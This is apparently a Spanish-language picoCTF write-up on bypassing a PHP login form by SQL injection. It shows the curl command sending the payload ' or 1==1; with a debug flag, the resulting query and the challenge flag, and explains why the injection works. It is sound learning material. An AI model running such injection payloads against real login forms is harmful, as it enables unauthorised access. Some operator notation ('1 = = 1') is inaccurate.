**Reto**
	
**Descripción**
	Do you think you can log us in? Try to see if you can login! http://fickle-tempest.picoctf.net:61733.

**Solución**
	1. Usando el navegador Mozilla Firefox, realizando inyección SQL (SQL Injection).
		<head></head><body><h1>Logged in!</h1><p>Your flag is: picoCTF{s0m3_SQL_85832275}</p></body>
		Realizando una inyección SQL (SQL Injection).
/
	2. Usando CLI y el previo conocimiento en el navegador web de que se usa un acceso mediante PHP.
		┌──(kali㉿kali)-[~]
		└─$ curl -s http://fickle-tempest.picoctf.net:53615/login.php -d "username=admin&password=' or 1==1;&debug=1"
		<pre>username: admin
		password: ' or 1==1;
		SQL query: SELECT * FROM users WHERE name='admin' AND password='' or 1==1;'
		</pre><h1>Logged in!</h1><p>Your flag is: picoCTF{s0m3_SQL_85832275}</p>                                                                                                 
		┌──(kali㉿kali)-[~]
		└─$ 

**Notes**
	1. El reto consiste en evadir el sistema de autenticación web mediante inyección SQL (SQL Injection).
	2. El formulario de login envía los datos a un script PHP (login.php) que construye dinámicamente una consulta SQL.
	3. La aplicación no valida ni sanitiza correctamente los datos ingresados por el usuario.
	4. Se utilizó el payload:
		' or 1 = = 1;  o ' or 1 = = 1--
		para alterar la lógica de la consulta SQL.  
	5. La condición 1 = = 1 siempre es verdadera, provocando que el WHERE se evalúe como verdadero y permita el acceso sin conocer la contraseña.
	6. Consulta resultante:
		SELECT * FROM users WHERE name='admin' AND password = '' or 1 = = 1;
	7. Debido a la precedencia lógica del operador OR, la autenticación se vuelve válida para cualquier usuario.
	8. Primero se comprobó la vulnerabilidad manualmente desde el navegador.
	9. Posteriormente se automatizó el acceso usando curl desde CLI para enviar una petición POST directamente.
	10. El parámetro debug=1 permitió visualizar la consulta SQL ejecutada, confirmando la vulnerabilidad.
	11. Tipo de vulnerabilidad explotada:
		- Authentication Bypass
		- SQL Injection
	12. Conceptos clave:
		12.1. Las consultas SQL dinámicas sin validación permiten manipulación del query.
		12.2. Los operadores lógicos (OR, AND) pueden alterar la autenticación.
		12.3. Herramientas CLI como curl permiten reproducir ataques web sin navegador.
		12.4. Los modos debug pueden filtrar información sensible del backend.

**Referencias**
	